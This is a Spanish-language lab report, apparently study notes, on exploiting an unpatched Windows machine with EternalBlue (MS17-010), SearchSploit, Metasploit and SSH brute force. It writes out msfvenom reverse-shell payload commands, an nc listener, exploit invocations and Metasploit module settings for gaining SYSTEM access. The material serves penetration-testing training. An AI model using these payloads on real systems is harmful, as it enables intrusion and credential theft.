Documentos de Referencia: "AS-I - Explotación de Vulnerabilidades_ Windows.pdf"

# Informe Técnico: Explotación de Vulnerabilidades en Sistemas Windows

## 1. Resumen Ejecutivo
Este informe detalla las herramientas y técnicas para la explotación de vulnerabilidades en sistemas Windows, con un enfoque práctico en la vulnerabilidad **EternalBlue**. Se exploran herramientas como **SearchSploit** y **SploitScan** para la identificación y gestión de *exploits*, y se muestra cómo usar **Metasploit Framework** para escanear y explotar una máquina Windows. El documento culmina con una demostración completa de la explotación de EternalBlue de forma manual y con Metasploit, así como la explotación de servicios como SSH, FTP y Elasticsearch para obtener acceso al sistema.

---

## 2. Conceptos Fundamentales

* **SearchSploit:** Es una utilidad de línea de comandos que permite buscar, copiar y descargar *exploits* y *shellcodes* del repositorio **Exploit-DB**. Al instalarse, descarga una copia local del repositorio en archivos CSV, que contienen metadatos sobre *exploits*, *shellcodes* y documentación. Permite realizar búsquedas básicas, filtrar resultados, excluir términos no deseados y copiar *exploits* a un directorio de trabajo.
* **SploitScan:** Es una herramienta diseñada para agilizar el proceso de identificar *exploits* para vulnerabilidades conocidas. Proporciona información detallada sobre las vulnerabilidades, incluyendo el *score* de **CVSS**. También integra datos del **Exploit Predict Scoring System (EPSS)**, que estima la probabilidad de explotación de una vulnerabilidad.
* **EternalBlue:** Un *exploit* desarrollado por la **NSA** que se filtró en 2017 y fue utilizado en el ataque global de *ransomware* **WannaCry**. Aprovecha una vulnerabilidad en la implementación del protocolo **Server Message Block (SMB)** versión 1 de Microsoft. La vulnerabilidad, identificada como **CVE-2017-0144**, permitía a un atacante remoto ejecutar código en sistemas Windows sin parchear. La contramedida oficial de Microsoft fue el parche de seguridad **MS17-010** y la recomendación de deshabilitar SMBv1.
* **Named Pipes:** Mecanismos de comunicación entre procesos en sistemas Windows, utilizados para permitir la interacción entre diferentes aplicaciones. Algunos ejemplos son `spoolss` (para servicios de impresión), `samr` (para la administración de cuentas de seguridad) y `netlogon` (para la autenticación en dominios).
* **Servidor IIS:** Un servicio de Microsoft que convierte un ordenador Windows Server en un servidor web, permitiendo alojar sitios web de forma local o remota. También puede ofrecer servicios como FTP y SMTP.

---

## 3. Procedimientos Prácticos
Los procedimientos a continuación detallan cómo explotar la vulnerabilidad de EternalBlue, así como otros servicios comunes, en un entorno de laboratorio con una máquina **Kali Linux** (atacante) y una máquina **Metasploitable3 Windows** (víctima).

### Uso de SearchSploit para la Búsqueda de Exploits
SearchSploit se utiliza para encontrar *exploits* relevantes en la base de datos local.
1.  **Búsqueda básica:** Ejecuta `searchsploit <término>` para buscar por una palabra clave, por ejemplo: `searchsploit ftpd`.
2.  **Filtrado por múltiples términos:** Para refinar la búsqueda, puedes añadir más términos. Por ejemplo: `searchsploit ftpd linux overflow`.
3.  **Excluir términos:** Usa el parámetro `--exclude` para eliminar resultados no deseados. Por ejemplo: `searchsploit ftpd linux overflow --exclude="stack|local|dos"`.
4.  **Búsqueda por título:** El parámetro `-t` permite buscar coincidencias exactas en el título del *exploit*. Ejemplo: `searchsploit -t "SCO Open Server 5.0.5"`.
5.  **Obtener información detallada:** Usa el parámetro `-p` seguido del ID de un *exploit* para ver su información, incluyendo su URL en Exploit-DB, el tipo de archivo y los CVEs asociados. Por ejemplo: `searchsploit -p 45939`.
6.  **Copiar un *exploit*:** Utiliza el parámetro `-m` para copiar un *exploit* a una ubicación específica en tu sistema. Por ejemplo: `searchsploit -m 45939 /home/kali/Desktop`.
7.  **Examinar el código de un *exploit*:** El parámetro `-x` muestra el código del *exploit* directamente en la consola, lo que evita tener que copiarlo y abrirlo en un editor de texto.

### Explotación de EternalBlue (Método Manual)
Este procedimiento simula un ataque manual, sin usar el módulo predefinido de Metasploit.
1.  **Identificar la máquina objetivo:** Usa `ifconfig` para conocer tu propia IP y segmento de red. Luego, usa `sudo arp-scan <segmento_de_red>` para escanear la red y encontrar la IP de la máquina víctima (Metasploitable3). En este caso, la IP es `10.0.1.12`.
2.  **Verificar la vulnerabilidad:** Lanza un escaneo de vulnerabilidades con `nmap` contra el puerto 445 del objetivo. El comando `nmap -sV --script vuln 10.0.1.12 -p 445` escaneará la máquina y confirmará si es vulnerable al parche `ms17-010`, indicando un alto riesgo y el CVE asociado.
3.  **Comprobar *Named Pipes*:** El *script* `checker.py` del repositorio de *exploits* MS17-010 puede usarse para verificar si la máquina objetivo está parcheada y si hay *named pipes* accesibles. Nota: Este *script* funciona con **Python 2**. Si el *script* falla, es posible que el módulo `impacket` esté faltando o sea incompatible. Se recomienda crear un entorno virtual para instalar la versión `0.9.22` de `impacket`.
4.  **Preparar el *Shellcode* y el *Payload*:**
    * **Compilar el *kernel shellcode*:** Usa `nasm -f bin shellcode/eternalblue_kshellcode_x64.asm -o shellcode_x64_kernel.bin` para compilar el código ensamblador del *kernel* en un archivo binario.
    * **Generar el *payload*:** Utiliza `msfvenom` para crear un *payload* de **Reverse shell** de tipo `reverse_tcp`. Comando: `msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=10.0.1.8 -a x64 --platform=windows -f raw -o shellcode_x64_payload.bin`.
    * **Unir los binarios:** Con `cat`, combina el *kernel shellcode* y el *payload* en un solo archivo binario: `cat shellcode_x64_kernel.bin shellcode_x64_payload.bin > shellcode_x64.bin`.
5.  **Lanzar la explotación:**
    * Primero, pon tu máquina atacante a la escucha con `nc -lvnp 4444`.
    * En otra terminal, ejecuta el *exploit* con el *payload* combinado: `python2 eternalblue_exploit7.py 10.0.1.12 shellcode_x64.bin`.
    * La máquina víctima se conectará a tu *listener*, otorgándote una *shell* con privilegios de **`NT AUTHORITY\SYSTEM`**.

### Explotación con Metasploit Framework
Metasploit simplifica enormemente el proceso de explotación de EternalBlue.
1.  **Entrar a la consola:** Abre `msfconsole` con privilegios de superusuario: `sudo msfconsole`.
2.  **Seleccionar el módulo:** Usa el comando `use exploit/windows/smb/ms17_010_eternalblue` para cargar el módulo de EternalBlue.
3.  **Configurar opciones:** Usa `show options` para ver los parámetros necesarios. El único requerido es `RHOSTS`. El *payload* por defecto es `windows/x64/meterpreter/reverse_tcp`, que nos dará una **Meterpreter session**.
4.  **Establecer la IP objetivo:** Usa `set rhosts 10.0.1.12` para configurar el objetivo.
5.  **Ejecutar el *exploit*:** Escribe `run` o `exploit` para iniciar el ataque.
6.  **Acceso obtenido:** Metasploit gestionará la conexión y te proporcionará una sesión de Meterpreter, donde puedes ejecutar comandos como `getuid` para verificar que tienes privilegios de **`NT AUTHORITY\SYSTEM`**.

### Ataque de Fuerza Bruta y Obtención de Credenciales con Metasploit
Metasploit también puede automatizar ataques de fuerza bruta contra servicios como SSH o FTP.
1.  **Seleccionar el módulo de SSH:** Carga el módulo `auxiliary/scanner/ssh/ssh_login`.
2.  **Configurar opciones:** Usa `show options` y `set` para configurar los parámetros, como `RHOSTS`, `USERNAME`, `PASS_FILE` (la ruta a un diccionario de contraseñas) y `STOP_ON_SUCCESS`.
3.  **Ejecutar el ataque:** Lanza el ataque con `run`.
4.  **Acceso a la sesión:** Una vez que el ataque tiene éxito, Metasploit abrirá una sesión de **SSH**. Puedes interactuar con ella usando el comando `sessions -i <ID>` para obtener una *shell* en la máquina víctima.

---

## 4. Conclusiones y Puntos Clave
### Importancia y Beneficios de Seguridad
La explotación de vulnerabilidades, como la de EternalBlue, demuestra la importancia de la gestión de parches. Un solo *exploit* antiguo puede comprometer múltiples sistemas si no se actualizan. La controversia alrededor de la NSA y su estrategia de almacenar vulnerabilidades subraya la necesidad de una divulgación responsable para que los desarrolladores puedan parchear las fallas a tiempo. Herramientas como SearchSploit y SploitScan son fundamentales para mantenerse al día con las vulnerabilidades y sus *exploits*, mientras que Metasploit automatiza y simplifica el proceso de prueba de penetración, permitiendo a los profesionales enfocarse en la estrategia del ataque.

### Puntos de Aprendizaje Clave
* La vulnerabilidad de **EternalBlue** es un caso de estudio crucial para entender el impacto de los *exploits* masivos y la importancia de los parches de seguridad.
* Herramientas como **SearchSploit** permiten a los auditores de seguridad buscar, filtrar y examinar *exploits* de manera eficiente sin necesidad de conexión a internet.
* **SploitScan** ofrece un enfoque más moderno, incorporando el **EPSS** para predecir la probabilidad de explotación y ayudar a priorizar las vulnerabilidades a parchear.
* **Metasploit Framework** es una herramienta de explotación extremadamente potente que puede simular un ataque completo, desde la recolección de información hasta la post-explotación.
* La capacidad de realizar una explotación manual (compilando *shellcode* y uniendo *payloads*) versus una explotación automatizada con Metasploit ilustra la diferencia entre el conocimiento profundo de los mecanismos del *exploit* y la eficiencia de una herramienta de automatización.

### Relevancia Técnica
Los procedimientos detallados en este informe son directamente aplicables a la fase de explotación de un pentesting. El uso de comandos como `nmap` para el reconocimiento, `searchsploit` para la búsqueda de *exploits* y `msfconsole` para la explotación y la post-explotación son habilidades de alta demanda en el campo de la ciberseguridad. La experiencia en la creación de entornos de laboratorio controlados para practicar la explotación, así como la resolución de problemas técnicos (como la incompatibilidad de versiones de Python), son fundamentales para un profesional en este campo. La capacidad de obtener el máximo nivel de privilegios (`NT AUTHORITY\SYSTEM`) en un sistema Windows a través de un *exploit* es una demostración clara de un ataque exitoso.